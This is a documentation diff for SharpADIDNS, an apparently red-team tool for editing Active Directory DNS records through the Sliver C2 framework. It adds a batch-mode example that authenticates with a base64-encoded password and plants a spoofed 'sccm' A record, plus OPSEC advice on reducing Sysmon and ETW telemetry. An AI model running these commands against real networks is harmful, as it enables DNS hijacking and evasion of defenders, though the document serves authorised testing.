@@ -445,6 +445,38 @@ This is a Sliver-side knob (`execute-assembly -p <process.exe>`), not a SharpADI
 - **`@argfile.txt`** expects the file to exist on the *target* host. Not useful in C2 unless you've already dropped a file there (which is itself an artifact).
 - **`--backup-to <file>`** (with a real path, not `-`) writes the file in the sacrificial process's CWD, often `C:\Windows\System32`. The file persists after the process exits. Use `--backup-to -` (or rely on the receipt's `previous_state`).
 
+### Batch mode (`--script`)
+
+A single `execute-assembly` invocation runs multiple actions. Statements are `;`-separated; each statement is a regular action verb with its own flags, applied on top of the outer flags (which become defaults).
+
+```bash
+sliver > execute-assembly -p dllhost.exe SharpADIDNS.exe \
+    --c2 \
+    --username 'redteamnotes\redpen' \
+    --password-base64 UmVkdGVhbU4wdDNzLg== \
+    --zone redteamnotes.local \
+    --dn DC=redteamnotes,DC=local \
+    --server dc.redteamnotes.local \
+    --script "
+        enum;
+        add --name sccm --type A --data 10.0.0.66 --mimic-aging;
+        query --name sccm;
+        disable --name old-host
+    "
+```
+
+Stdout contains one receipt JSON line per statement (in order), plus a final summary line:
+
+```json
+{"_type":"script_summary","total":4,"succeeded":4,"failed":0,"on_error":"halt"}
+```
+
+**Why this matters for OPSEC**: each `execute-assembly` spawns a sacrificial process (Sysmon EID 1) and loads the CLR (.NET ETW chatter). N actions run as N separate `execute-assembly` calls cost N spawns; the same N actions run via `--script` cost **one** spawn. Less process noise to correlate, fewer process trees to investigate.
+
+`--script-on-error halt` (default) stops on the first failure. `--script-on-error continue` keeps running and reports the totals in the summary.
+
+Action-scoped flags (`--name`, `--data`, `--raw`, `--force`, `--append`, `--mimic-aging`, `--set-owner`, `--type`, `--srv-*`, `--mx-pref`, `--filter-*`, `--only-tombstoned`, `--no-tombstoned`) are reset per statement -- they don't bleed between statements. Targeting and auth flags (`--zone`, `--dn`, `--server`, `--username`, `--password*`, `--ldaps`, `--partition`) are inherited from outer and can be overridden per statement.
+
 ## Record format reference
 
 Every `dnsRecord` value is a `DNS_RPC_RECORD` blob:
